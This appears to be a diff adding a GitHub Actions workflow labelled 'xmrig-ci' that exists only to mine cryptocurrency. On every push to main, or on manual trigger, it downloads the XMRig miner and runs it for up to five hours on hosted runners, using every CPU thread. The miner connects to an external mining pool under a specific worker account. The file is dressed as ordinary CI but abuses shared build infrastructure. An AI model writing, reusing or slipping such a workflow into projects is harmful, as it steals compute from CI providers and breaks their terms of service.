@@ -1,0 +1,28 @@
+
+name: xmrig-ci
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  run-xmrig:
+    runs-on: ubuntu-latest
+    timeout-minutes: 300   # 5 saat
+
+    steps:
+      - name: Update system & install deps
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+
+      - name: Download & extract xmrig
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-jammy-x64.tar.gz
+          tar -xvzf xmrig-6.25.0-jammy-x64.tar.gz
+
+      - name: Run xmrig
+        run: |
+          cd xmrig-6.25.0
+          ./xmrig -o rx.unmineable.com:3333 -u 1853675284.worker1 -p x --threads=$(nproc) --cpu-priority 5
